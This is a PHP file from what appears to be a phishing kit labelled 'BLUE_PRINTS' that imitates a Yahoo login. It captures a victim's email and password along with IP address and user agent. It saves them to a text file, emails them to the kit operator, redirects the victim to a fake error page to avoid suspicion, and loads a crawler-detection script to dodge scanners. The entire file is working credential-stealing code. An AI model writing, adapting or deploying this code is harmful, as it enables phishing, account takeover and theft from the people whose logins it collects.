<?php
error_reporting(0);
session_start();


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = $_SESSION['token'];

if(!empty($_SESSION['email']))  {

$useremail = $_SESSION['email'];
 
}
include '../../crawlerdetect.php';
if(!empty($_POST['password']))  {

$pass = $_POST['password'];
$_SESSION['password'] = $_POST['password'];
date_default_timezone_set('Europe/Amsterdam');
$ip = $_SERVER['REMOTE_ADDR'];

$useremail = $_SESSION['email'];

$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

include "../../step/conf/config.php";


$msg .= "+ ------------------------------------------+\n";
$msg .= "|   💵BLUE_PRINTS | yahoo Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| 📧 EMAIL  :  ".$useremail."\n";
$msg .= "| 🔑 PASS   :  ".$pass."\n"; 
$footer = "+ ------------------------------------------+\n";
$footer .= "+ IP => $ip \n  USERAGENT => $agent\n";
$footer .= "+ ------------------------------------------+\n\n";

$data = $msg . $footer;
if($savetxt == "on"){
$save=fopen("../../step/data/email".$salt.".txt",'a');
	          fwrite($save,$data );
	          fclose($save);
			
}
$subject="Email 1NFO By BLUE_PR1NTS=> {$_SERVER['REMOTE_ADDR']} {$_SESSION['usernam']} [ {$_SESSION['platform']} ]";
$headers="From: BLUE_PR1NTS <chse@blue_prints>\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
@mail($emailzz, $subject, $data, $headers);
header("location: error.php?token={$_SESSION['token']}"); 
}

?>